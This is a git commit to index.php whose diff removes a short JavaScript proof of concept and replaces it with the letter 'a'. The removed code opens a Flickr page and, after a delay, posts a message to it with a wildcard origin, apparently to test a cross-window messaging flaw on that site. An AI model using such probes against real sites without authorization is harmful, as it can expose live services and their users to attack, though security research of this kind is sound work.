8a4ed05cc5f574d62e92c6cd7b07a383537f3fbf
shicolino01 <105289325+shicolino01@users.noreply.github.com>
2022-05-10 19:34:02 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,2 +1,1 @@
-
-<script> function poc(){ window.win=window.open('https://www.flickr.com/photos/195182863@N03'); var msg='//flickr:CMPframed'; setTimeout(function(){win.postMessage(msg,'*');}, 10000); } </script> <a href="#" onclick="poc();">PoC</a>
+a
